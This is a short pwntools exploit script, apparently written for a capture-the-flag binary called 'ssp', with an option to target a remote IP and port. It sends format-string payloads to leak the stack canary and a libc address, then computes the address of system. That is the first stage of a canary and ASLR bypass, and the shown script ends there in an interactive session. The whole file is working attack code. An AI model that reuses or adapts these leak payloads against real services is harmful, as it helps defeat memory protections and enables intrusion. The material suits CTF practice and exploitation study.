from pwn import *
import time
debug=1


elf = ELF('./ssp')
#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
#libc = ELF(libc_name)
context.log_level = 'debug'
if debug:
	p= process('./ssp')
else:
	p = remote('10.120.100.201', 8080)#process('./pwn1')
	#p = remote('127.0.0.1', 10006)
def z(a =''):
	if debug:
		gdb.attach(p,a)
z('c')
p.recvuntil('$')
p.sendline('%'+str(0xb+5+1)+'$p')
canary = int(p.recvuntil(' :invalid option.').replace(' :invalid option.',''),16)
print '[+]canary',hex(canary)
p.recvuntil('$')
p.sendline('%'+str(0xb+5+1+2)+'$p')
libc_address = int(p.recvuntil(' :invalid option.').replace(' :invalid option.',''),16)-0x21b97#-231#-libc.symbols[' __libc_start_main']
print '[+]system',hex(libc_address + 0x4f440)
p.interactive()
